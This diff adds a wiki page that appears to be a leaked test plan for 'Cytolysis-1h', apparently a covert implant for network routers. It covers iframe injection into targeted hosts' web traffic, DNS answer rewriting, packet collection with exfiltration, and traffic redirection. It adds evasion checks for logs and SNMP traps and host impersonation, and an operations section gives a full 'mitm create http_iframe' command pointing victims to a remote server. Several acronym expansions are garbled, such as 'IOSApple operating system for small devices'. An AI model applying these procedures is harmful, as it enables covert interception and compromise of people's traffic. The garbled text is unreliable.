@@ -1,0 +1,176 @@
+
+                        Owner: User #71467
+Cytolysis
+Test Plan for Cytolysis-1h
+
+HG Base - complete
+Install - complete - Test 1
+
+Uninstall - complete - Test 1
+
+Restart Modules - complete - Test 2
+
+CT Session - complete - Test 1
+
+
+
+Sup Failover Testing
+Verify state after failover
+Install on one SUP and then force failover through IOSApple operating system for small devices command
+Install on one SUP and then test crash to cause failover to other SUP
+Install on one SUP and then pull active SUP module to cause failover to other SUP
+
+
+Instlal on new SUPfail back to original and re-install
+
+Fail back to original and re-install
+
+
+ACE - complete - Test 4
+test entering all commands foreseen during op, variety of show commands
+test entering commands that don't exist, typos
+test entering unsupported non-show commands
+
+
+SMITE - still seeing print messages, awaiting Xetron - options -ac -sm -t
+test that rules can be created/deleted/enabled/disabled with all parameters expected during op - timed rule, max times to affect, max per host
+test creating multiple rules at a time
+Test creating a rule that targets multiple source hosts to single destination as well as single source to single destination
+test that filterbroker can be restarted with active rules, with rules that are inactive, new rules can be entered after restart
+test iframe/exploitation of target
+Verify that counters increment in CTCounter Terrorism show commands related to SMITE
+Run wireshark on target and examen output of SIMTE session
+Verify no syslogs, DNSDomain Name System queries or SNMPSimple Network Management Protocol Traps sent during Iframe
+verify iframe not injected for traffic that does not match SMITE rule - from other hosts, from target host to different destination, traffic to other ports (test 443)
+Use SMITE while pps threshold is reached - verify whether rule is automatically re-enabled
+Verify that traffic from other hosts that are not targeted in SMITE rule is not impacted by SMITE rule
+
+
+DIVRT- still seeing print messages, awaiting Xetron - options -ac -sm -t
+test that rules can be created/deleted/enabled/disabled with all parameters expected during op
+test creating multiple rules at a time
+test that filterbroker can be restarted with active rules, with rules that are inactive, new rules can be entered after restart
+test the dns replace ip functionality - to web servers
+verify that dns replace ip not executed against traffic that does not match DIVRTDigital Imaging & Video Recovery Team rule - from other hosts, from target host to different desination, traffic to other ports
+
+
+Packet Collection - options -t, size limits?
+test that rules can be created/deleted/enabled/disabled with all parameters expected during op
+test creating multiple rules at a time
+test that collect can be restarted with active rules, rules that are inactive, new rules can be entered after restart
+test an actual packet collection and exfil parse
+verify that traffic that does not match the collect rule is not affected
+
+
+Redirection - complete Test 30 - options -t -sm
+test that rules can be created/deleted/enabled/disabled with all parameters expected during op -done
+test creating multiple rules at a time - done
+test that redir module can be restarted with active rules, rules that are inactive, new rules can be entered after restart - done
+test redirection for target to destination - done
+verify that traffic is not redirect that does not match redir rule - from other hosts, from target host to different destination, traffic to other ports - done
+verify that no traffic punches through to original destination
+
+
+Performance Testing - Characterize CPU impact of capabilties - underway
+impact of SMITE
+impact DIVRT
+impact of Packet collection
+impact of redirection
+
+
+Ad-Hoc Testing
+line cards being taken out/added/reloaded - complete - Test 5
+
+re-attack - complete - Test 3 
+
+Perform system admin commands - complete - Test 12
+
+Add latency - complete - Test 13
+
+Run Stack Scrambler - Complete - multiple
+
+wireshark of comms traffic - complete - test 19
+
+reload device during HG install - complete Test 17
+
+perform system admin during HG upload -  complete Test 18
+
+SP and linecard CPU - complete test 22
+input queue buffer checks
+test RAA assists dropped when HG uninstalled - complete Test 23
+test RAA dropped when packet assist threshold exceeded - complete Test 23
+verify if assist for flux 4 ip is present during CTCounter Terrorism session - assist to flux 4 not present
+
+Verify that impersonated host can still get to flx 4 ip and other places
+verify assist is dropped once max number of matches occur on smite rule, or time duration expires
+Verify CPU impact and impact to other hosts who are browsing to a SMITE rule destination, but do not match smite rule
+
+
+On-Device OpSec - complete - Test 11
+
+CONOP Testing  
+
+ 
+CONOP
+Designate a host to impersonate when making CTCounter Terrorism session
+Verify the IOSApple operating system for small devices version and status of the device - can we do this?
+IAC attack through flux nodes, coming out from mgmt network to vlan 1 IP
+Upload HG and allow to run for some time to see traffic
+Send a trigger packet from flx mgmt host to vlan 1 IP on UDP/161 asking for a callback to webserver flux node using designated impersonated host
+ACE Commands to run before Packet Collection or SMITE
+
+show users all- verify no one else logged on
+show module - verify state of module 2, verify RP in slot 5 is active, slot 6 is hot
+show redundancy switchover - verify last switchover time and reason
+show ver - verify uptime and software version of device - can this be done before IAC/HG?  if so, should be done then
+show run - verify that the configuration hasn't changed - VLANVirtual Local Area Network interfaces still configured with nat and unicast rpf, logging levels are same, acls, verify last time config was saved
+show proc cpu hist - verify CPU utilization of RP
+show history all - verify what commands have been run lately
+show log - verify any log messages, error conditions, acl log entries, lack of acl log entries.
+show arp - verify hosts in arp table
+show ip nat stat - verify how many NATNetwork Address Translation translations are active
+show ip nat trans - collect information on NATNetwork Address Translation flows - identify DNSDomain Name System servers in use for VLANVirtual Local Area Network 19, identify unique active hosts, identify destination web pages on port 80
+show ip route - verify OSPFOpen Shortest Path First routes
+show int vlan 2 - how much traffic currently to/from uplinks
+show int vlan 19 - how much traffic currently to/from customer of interest
+
+Before attack, check packet assist threshold value - packet get_assist_threshold_status.  Note that if packet assist threshold is reached, assists for SMITE will be dropped silently.
+Choose a client(s)/server to iframe inject.    Ideally, could identify a host you want to SMITE and a destination that only that host tends to go to on port 80.  Create a rule that will add the iframe for a limited amount of time, and a limited total number of times per host if executing against a range of clients and overall limit.  These flags should be:
+mitm create http_iframe 10.11.0.10 255.255.255.255 0 0 X.X.X.XX (LVLT-GOGL-8-8-8[US]) 255.255.255.255 80 80 http://X.X.X.XX (LVLT-GOGL-8-8-8[US]):8888/?promo_code=1Z45RDJ" -ac 2 -sm 2 -t 60s -en -bc -bk
+At this point, all traffic to X.X.X.XX (LVLT-GOGL-8-8-8[US]) is being promoted - run packet get_assist_threshold_status to verify maximum pps sent.  Rule will be disabled after 60 seconds. 
+
+Sub-Pages:
+
+
+Cytolysis-1h HG v3.1.6 Test Plan [Xetron]
+
+
+Cytolysis-1h HG v3.1.6 Delivery 
+
+
+Cytolysis CONOP Notes [Xetron]
+
+
+Cytolysis-1h Testing [Xetron]
+
+
+
+Previous versions:
+| 1 
+| 2 
+| 3 
+| 4 
+| 5 
+| 6 
+| 7 
+| 8 
+| 9 
+| 10 
+| 11 
+| 12 
+| 13 
+| 14 
+| 15 [Xetron]
+| 16 [Xetron]
+|
+                    
